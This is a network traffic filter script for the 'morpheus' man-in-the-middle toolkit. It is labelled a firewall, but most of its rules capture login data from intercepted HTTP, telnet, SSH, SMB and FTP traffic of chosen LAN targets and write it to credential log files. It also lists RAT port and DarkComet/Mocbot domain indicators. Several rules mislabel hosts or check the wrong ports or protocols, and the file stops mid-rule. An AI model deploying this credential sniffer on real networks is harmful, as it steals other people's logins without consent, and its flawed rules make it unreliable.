############################################################################
#                                                                          #
#  HTTPS Request/Response Filter                                           #
#  based on code from ALoR & NaGA                                          #
#                                                                          #
#  This program is free software; you can redistribute it and/or modify    #
#  it under the terms of the GNU General Public License as published by    #
#  the Free Software Foundation; either version 2 of the License, or       #
#  (at your option) any later version.                                     #
#                                                                          #
#  use: http://string-functions.com/string-hex.aspx to decode tcp hex      #
############################################################################


##
#  This filter will act like a firewall reporting OR blocking connections
#  inside Local Lan (selected targets), Reports suspicious tcp activity In
#  the targets selected And also dumps to a logfile logins captured under
#  mitm + filter execution In services like: http,ssh,smb,telnet,ftp...
#  Repors the existence of bootnet connections And reports DHCP requests. 
##






##########################################################
## target [ 1 ] connections to filter trougth morpheus  ##
## chose allways target [1] as your agressive scan type ## 
##########################################################
##
# [ from ME -> OUTSIDE ]
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 80) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:80 http ☆");
        # log credentials into morpheus/logs/http_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./http_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: HTTP login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/http_creds.log
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./http_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: HTTP login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/http_creds.log
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./http_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: HTTP login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }
        }
        }
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 23) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:23 telnet ☆");
        # log credentials into morpheus/logs/telnet_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./telnet_creds.log");
         msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
         msg("[morpheus] | status: TELNET login detected!");
         msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/telnet_creds.log
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./telnet_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: TELNET login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/telnet_creds.log
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./telnet_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: TELNET login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }
        }
        }
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 21) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:21 ftp ☠");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 22) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:22 ssh ☆");
        # log credentials into morpheus/logs/ssh_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./ssh_creds.log");
         msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
         msg("[morpheus] | status: SSH login detected!");
         msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/ssh_creds.log
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./ssh_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: SSH login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/ssh_creds.log
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./ssh_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: SSH login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }
        }
        }
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 3389) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:3389 rdp ☆");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 443) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:443 https ☆");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 445) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:445 netbios ☠");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 139) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:139 netbios ☠");
}
if (ip.src == 'TaRONE' && ip.proto == UDP && udp.dst == 137) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:137 netbios ☠");
}
#
#
# [ IF YOU WANT TO BE PARANOIC, LEAVE THIS FUNTION AS IT IS ]...
# AND BE PREPARED TO DEAL WITH MANY PORT:53 TERMINAL OUTPUTS.
# IF NOT THEN YOU NEED TO COMMENT ( # ) THIS ENTIRE PARANOIC FUNTION
# ( ping -c 3 www.linux.org == arpa dns query :D )
#
#
if (ip.src == 'TaRONE' && ip.proto == UDP && tcp.dst == 53) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:53 dns ☆");
        if (search(DATA.data, "facebook")) {
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: DNS possible facebook query found!");
          msg("[morpheus] |  info : normal connection from source!");
          msg("[morpheus] |  hex  : 65 64 67 65 2d 63 68 61 74 08 66 61 63 65 62 6f 6f 6b 03 6f 6d");
          msg("[morpheus] |_ decoded: edge-chat.facebook.com\n");
        }else{
        if (search(DATA.data, "arpa")) {
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: DNS possible arpa query found!");
          msg("[morpheus] |  info : normal connection? OR arp poison query?");
          msg("[morpheus] |  hex  : 64 64 62 04 61 72 70 61");
          msg("[morpheus] |_ decoded: ddr.arpa\n");
        }
        }
}
#
# [ Reporting venom/metasploit possible rat ports ]...
#
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 666) {
  msg("\n[morpheus] host:TaRONE   [ ⊶  ]  port:666 rat ☠");
  msg("[morpheus] | status: possible rat agent found!");
  msg("[morpheus] |_ info : venom tool uses this port in is rat agents.\n");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 4444) {
  msg("\n[morpheus] host:TaRONE   [ ⊶  ]  port:4444 rat ☠");
  msg("[morpheus] | status: possible rat agent found!");
  msg("[morpheus] |_ info : metasploit uses this port in is rat agents.\n");
}
#
# [ END OF PARANOIC FUNTION ]...
#




###
# [ from OUTSIDE -> ME ]
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 80) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:80 http ☆");
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 445) {
  msg("\n[morpheus] host:TaRONE   [ <- ]  port:445 netbios ☠");
  msg("[morpheus] | status: remote connection detected!");
  msg("[morpheus] |_ info : port used by netapi vulnerability.\n");
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }
        }
        }
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 23) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:23 telnet ☠");
        # log credentials into morpheus/logs/telnet_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./telnet_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: TELNET login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/telnet_creds.log
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./telnet_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: TELNET login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/telnet_creds.log
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./telnet_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: TELNET login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }
        }
        }
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 21) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:21 ftp ☠");
        # log credentials into morpheus/logs/ftp_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./ftp_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: FTP login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/ftp_creds.log
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./ftp_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: FTP login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/ftp_creds.log
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./ftp_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: FTP login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }
        }
        }
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 22) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:22 ssh ☆");
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 443) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:443 https ☆");
}
if (ip.dst == 'TaRONE' && ip.proto == UDP && udp.src == 137) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:137 netbios ☠");
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 139) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:139 netbios ☠");
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 3389) {
  msg("\n[morpheus] host:TaRONE   [ <- ]  port:3389 rdp ☠");
  msg("[morpheus] | status: remote desktop protocol connection!");
  msg("[morpheus] |_ info : rdp its commonly used by hackers.\n");
}
#
# IF YOU WANT TO BE PARANOIC, LEAVE THIS FUNTION AS IT IS ...
# IF NOT THEN YOU NEED TO COMMENT ( # ) THIS ENTIRE PARANOIC FUNTION
#
if (ip.dst == 'TaRONE' && ip.proto == UDP && udp.src == 53) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:53 dns ☠");
    if (search(DATA.data, "bbjj.househot.com")) {
      msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
      msg("[morpheus] | status: DNS remote connection found!");
      msg("[morpheus] |  info : possible Mocbot IRC Bot (MS06-040)");
      msg("[morpheus] |  hex  : 62 62 6a 6a 2e 68 6f 75 73 65 68 6f 74 2e 63 6f 6d");
      msg("[morpheus] |_ decoded: bbjj.househot.com\n");
    }else{
    if (search(DATA.data, "ypgw.wallloan.com")) {
      msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
      msg("[morpheus] | status: DNS remote connection found!");
      msg("[morpheus] |  info : possible Mocbot IRC Bot (MS06-040)");
      msg("[morpheus] |  hex  : 79 70 67 77 2e 77 61 6c 6c 6c 6f 61 6e 2e 63 6f 6d");
      msg("[morpheus] |_ decoded: ypgw.wallloan.com\n");
    }
    }
}
#
# [ Reporting venom/metasploit/bots possible ports ]...
#
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 666) {
  msg("\n[morpheus] host:TaRONE   [ ⊶  ]  port:666 rat ☠");
  msg("[morpheus] | status: possible rat agent found!");
  msg("[morpheus] |_ info : venom tool uses this port in is rat agents.\n");
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 4444) {
  msg("\n[morpheus] host:TaRONE   [ ⊶  ]  port:4444 rat ☠");
  msg("[morpheus] | status: possible rat agent found!");
  msg("[morpheus] |_ info : metasploit uses this port in is rat agents.\n");
}
#
# [ END OF PARANOIC FUNTION ]...
#






#########################################################
## target [ 2 ] connections to filter trougth morpheus ##
## chose allways target [ 2 ] as our simple scan type  ##
#########################################################
##
# from TARGET2 -> OUTSIDE
if (ip.src == 'TaRTWO' && ip.proto == TCP && tcp.dst == 80) {
  msg("[morpheus] host:TaRTWO   [ -> ]  port:80 http ☆");
        # log credentials into morpheus/logs/http_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./http_creds.log");
         msg("\n[morpheus] host:TaRTWO   [ ⊶  ]   found...");
         msg("[morpheus] | status: HTTP login detected!");
         msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/http_creds.log
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./http_creds.log");
          msg("\n[morpheus] host:TaRTWO   [ ⊶  ]   found...");
          msg("[morpheus] | status: HTTP login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/http_creds.log
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./http_creds.log");
          msg("\n[morpheus] host:TaRTWO   [ ⊶  ]  found...");
          msg("[morpheus] | status: HTTP login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }
        }
        }
}
if (ip.src == 'TaRTWO' && ip.proto == TCP && tcp.dst == 443) {
  msg("[morpheus] host:TaRTWO   [ -> ]  port:443 https ☆");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 445) {
  msg("[morpheus] host:TaRTWO   [ -> ]  port:445 netbios ☠");
}
if (ip.src == 'TaRTWO' && ip.proto == TCP && tcp.dst == 139) {
  msg("[morpheus] host:TaRTWO   [ -> ]  port:139 netbios ☆");
}
if (ip.src == 'TaRTWO' && ip.proto == TCP && tcp.dst == 22) {
  msg("[morpheus] host:TaRTWO   [ -> ]  port:22 ssh ☠");
        # log credentials into morpheus/logs/ssh_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./ssh_creds.log");
         msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
         msg("[morpheus] | status: SSH login detected!");
         msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/ssh_creds.log
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./ssh_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: SSH login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/ssh_creds.log
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./ssh_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
          msg("[morpheus] | status: SSH login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }
        }
        }
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 23) {
  msg("[morpheus] host:TaRTWO   [ -> ]  port:23 telnet ☠");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 21) {
  msg("[morpheus] host:TaRTWO   [ -> ]  port:21 ftp ☠");
}




##
# from OUTSIDE ->  TARGET2
if (ip.dst == 'TaRTWO' && ip.proto == TCP && tcp.src == 80) {
  msg("[morpheus] host:TaRTWO   [ <- ]  port:80 http ☆");
}
if (ip.dst == 'TaRTWO' && ip.proto == TCP && tcp.src == 443) {
  msg("[morpheus] host:TaRTWO   [ <- ]  port:443 https ☆");
}
if (ip.dst == 'TaRTWO' && ip.proto == TCP && tcp.src == 445) {
  msg("\n[morpheus] host:TaRONE   [ <- ]  port:445 netbios ☠");
  msg("[morpheus] | status: remote connection detected!");
  msg("[morpheus] |_ info : port used by netapi vulnerability.\n");
}
if (ip.dst == 'TaRTWO' && ip.proto == TCP && tcp.src == 139) {
  msg("[morpheus] host:TaRTWO   [ <- ]  port:139 netbios ☆");
}
if (ip.dst == 'TaRTWO' && ip.proto == TCP && tcp.src == 22) {
  msg("[morpheus] host:TaRTWO   [ <- ]  port:22 ssh ☆");
}
if (ip.dst == 'TaRTWO' && ip.proto == TCP && tcp.src == 23) {
  msg("[morpheus] host:TaRTWO   [ <- ]  port:23 telnet ☆");
}
if (ip.dst == 'TaRTWO' && ip.proto == TCP && tcp.src == 21) {
  msg("[morpheus] host:TaRTWO   [ <- ]  port:21 ftp ☆");
}






#########################################################
##          gateway 192.168.1.253 connections          ##
#########################################################
##
# from GATEWAY -> OUTSIDE
if (ip.src == '192.168.1.253' && ip.proto == TCP && tcp.dst == 80) {
  msg("[morpheus] host:192.168.1.253  [ -> ]  port:80 http ☆");
}
if (ip.src == '192.168.1.253' && ip.proto == UDP && udp.dst == 53) {
  msg("[morpheus] host:192.168.1.253  [ -> ]  port:53 dns ☆");
}
if (ip.src == '192.168.1.253' && ip.proto == TCP && tcp.dst == 443) {
  msg("[morpheus] host:192.168.1.253  [ -> ]  port:443 https ☆");
}
if (ip.src == '192.168.1.253' && ip.proto == TCP && tcp.dst == 445) {
  msg("[morpheus] host:192.168.1.253  [ -> ]  port:445 netbios ☠");
}
if (ip.src == '192.168.1.253' && ip.proto == TCP && tcp.dst == 139) {
  msg("[morpheus] host:192.168.1.253  [ -> ]  port:139 netbios ☠");
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*user.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:192.168.1.253   [ ⊶  ]  found...");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*USER.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:192.168.1.253   [ ⊶  ]  found...");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*USERNAME.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:192.168.1.253   [ ⊶  ]  found...");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }
        }
        }
}




##
# from OUTSIDE -> GATEWAY
if (ip.dst == '192.168.1.253' && ip.proto == TCP && tcp.src == 80) {
  msg("[morpheus] host:192.168.1.253  [ <- ]  port:80 http ☆");
}
if (ip.dst == '192.168.1.253' && ip.proto == TCP && tcp.src == 443) {
  msg("[morpheus] host:192.168.1.253  [ <- ]  port:443 https ☆");
}
if (ip.dst == '192.168.1.253' && ip.proto == TCP && tcp.src == 445) {
  msg("[morpheus] host:192.168.1.253  [ <- ]  port:445 netbios ☠");
}
if (ip.dst == '192.168.1.253' && ip.proto == TCP && tcp.src == 139) {
  msg("[morpheus] host:192.168.1.253  [ <- ]  port:139 netbios ☠");
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*user.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:192.168.1.253   [ ⊶  ]  found...");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*USER.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:192.168.1.253   [ ⊶  ]  found...");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*USERNAME.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:192.168.1.253   [ ⊶  ]  found...");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }
        }
        }
}
if (ip.dst == '192.168.1.253' && ip.proto == UDP && udp.src == 53) {
  msg("[morpheus] host:192.168.1.253  [ <- ]  port:53 dns ☆");
}






#########################################################
##           modem 192.168.1.254 connections           ##
#########################################################
##
# from MODEM -> OUTSIDE
if (ip.src == 'MoDeM' && ip.proto == TCP && tcp.src == 80) {
  msg("[morpheus] host:MoDeM  [ -> ]  port:80 http ☆");
}
if (ip.src == 'MoDeM' && ip.proto == TCP && tcp.src == 443) {
  msg("[morpheus] host:MoDeM  [ -> ]  port:443 https ☆");
}
if (ip.src == 'MoDeM' && ip.proto == TCP && tcp.src == 139) {
  msg("[morpheus] host:MoDeM  [ -> ]  port:139 netbios ☠");
}
if (ip.src == 'MoDeM' && ip.proto == UDP && udp.src == 53) {
  msg("[morpheus] host:MoDeM  [ -> ]  port:53 dns ☆");
}
if (ip.src == 'MoDeM' && ip.proto == TCP && tcp.src == 23) {
  msg("[morpheus] host:MoDeM  [ -> ]  port:23 telnet ☆");
}
if (ip.src == 'MoDeM' && ip.proto == TCP && tcp.src == 22) {
  msg("[morpheus] host:MoDeM  [ -> ]  port:22 ssh ☆");
}
if (ip.src == 'MoDeM' && ip.proto == TCP && tcp.src == 21) {
  msg("[morpheus] host:MoDeM  [ -> ]  port:21 ftp ☆");
}




##
# from OUTSIDE -> MODEM
if (ip.dst == 'MoDeM' && ip.proto == TCP && tcp.dst == 80) {
  msg("[morpheus] host:MoDeM  [ <- ]  port:80 http ☆");
}
if (ip.dst == 'MoDeM' && ip.proto == TCP && tcp.dst == 443) {
  msg("[morpheus] host:MoDeM  [ <- ]  port:443 https ☆");
}
#
# DETECTS: the presence of darkcomet rat connections...
# article: https://www.recordedfuture.com/darkcomet-rat-analysis/
#
if (ip.dst == 'MoDeM' && ip.proto == UDP && udp.dst == 53) {
  msg("[morpheus] host:MoDeM  [ <- ]  port:53 dns ☠");
        if (search(DATA.data, "burtproperties.com")) {
          msg("\n[morpheus] host:MoDeM   [ ⊶  ]  found...");
          msg("[morpheus] | status: DNS possible DarkComet query found!");
          msg("[morpheus] |  info : DarkComet RAT controller!");
          msg("[morpheus] |  hex  : 62 75 72 74 70 72 6f 70 65 72 74 69 65 73 2e 63 6f 6d");
          msg("[morpheus] |_ decoded: burtproperties.com\n");
        }else{
        if (search(DATA.data, "wilsoniusmaximus.com")) {
          msg("\n[morpheus] host:MoDeM   [ ⊶  ]  found...");
          msg("[morpheus] | status: DNS possible DarkComet query found!");
          msg("[morpheus] |  info : DarkComet RAT controller!");
          msg("[morpheus] |  hex  : 77 69 6c 73 6f 6e 69 75 73 6d 61 78 69 6d 75 73 2e 63 6f 6d");
          msg("[morpheus] |_ decoded: wilsoniusmaximus.com\n");
        }else{
        if (search(DATA.data, "shadows.sytes.net")) {
          msg("\n[morpheus] host:MoDeM   [ ⊶  ]  found...");
          msg("[morpheus] | status: DNS possible DarkComet query found!");
          msg("[morpheus] |  info : DarkComet RAT controller!");
          msg("[morpheus] |  hex  : 73 68 61 64 6f 77 73 2e 73 79 74 65 73 2e 6e 65 74");
          msg("[morpheus] |_ decoded: shadows.sytes.net\n");
        }
        }
        }
}
if (ip.dst == 'MoDeM' && ip.proto == TCP && tcp.dst == 445) {
  msg("[morpheus] host:MoDeM  [ <- ]  port:445 netbios ☠");
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:MoDeM   [ ⊶  ]  found...");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:TaRTWO   [ ⊶  ]  found...");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:TaRTWO   [ ⊶  ]  found...");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }
        }
        }
}
if (ip.dst == 'MoDeM' && ip.proto == TCP && tcp.dst == 139) {
  msg("[morpheus] host:MoDeM  [ <- ]  port:139 netbios ☠");
}
if (ip.dst == 'MoDeM' && ip.proto == TCP && tcp.dst == 23) {
  msg("[morpheus] host:MoDeM  [ <- ]  port:23 telnet ☠");
        # log credentials into morpheus/logs/telnet_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./telnet_creds.log");
          msg("\n[morpheus] host:MoDeM   [ ⊶  ]  found...");
          msg("[morpheus] | status: TELNET login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/telnet_creds.log
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./telnet_creds.log");
          msg("\n[morpheus] host:TaRTWO   [ ⊶  ]  found...");
          msg("[morpheus] | status: TELNET login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/telnet_creds.log
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./telnet_creds.log");
          msg("\n[morpheus] host:TaRTWO   [ ⊶  ]  found...");
          msg("[morpheus] | status: TELNET login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }
        }
        }
}
if (ip.dst == 'MoDeM' && ip.proto == TCP && tcp.dst == 22) {
  msg("[morpheus] host:MoDeM  [ <- ]  port:22 ssh ☆");
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:MoDeM   [ ⊶  ]  found...");
          msg("[morpheus] | status: SSH login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:TaRTWO   [ ⊶  ]  found...");
          msg("[morpheus] | status: SSH login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:TaRTWO   [ ⊶  ]  found...");
          msg("[morpheus] | status: SSH login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }
        }
        }
}
if (ip.dst == 'MoDeM' && ip.proto == TCP && tcp.dst == 21) {
  msg("[morpheus] host:MoDeM  [ <- ]  port:21 ftp ☠");
        # log credentials into morpheus/logs/ftp_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./ftp_creds.log");
          msg("\n[morpheus] host:MoDeM   [ ⊶  ]  found...");
          msg("[morpheus] | status: FTP login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/ftp_creds.log
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./ftp_creds.log");
          msg("\n[morpheus] host:MoDeM   [ ⊶  ]  found...");
          msg("[morpheus] | status: FTP login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }else{
        # log credentials into morpheus/logs/ftp_creds.log
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./ftp_creds.log");
          msg("\n[morpheus] host:MoDeM   [ ⊶  ]  found...");
          msg("[morpheus] | status: FTP login detected!");
          msg("[morpheus] |_ info : credentials found, log stored.   ✔\n");
        }
        }
        }
}
#
# PARANOIC DISCOVER: what devices (smartphones) are anuncing is presence to modem.
# Its writen to identify my phones, but it will report the connection of androids too.
# This funtion may also help us identify ARP poison attacks (many requests)
# 
if (ip.src == '0.0.0.0' && ip.proto == UDP && udp.dst == 67) {
  # DHCP: 192.168.1.95 respond to router (my is ip IS... my hostname IS...)
  if (search(DATA.data, "android-7f926b4b94fd40c17")) {
    msg("\n[morpheus] host:0.0.0.0        [ ⊶  ]  found...");
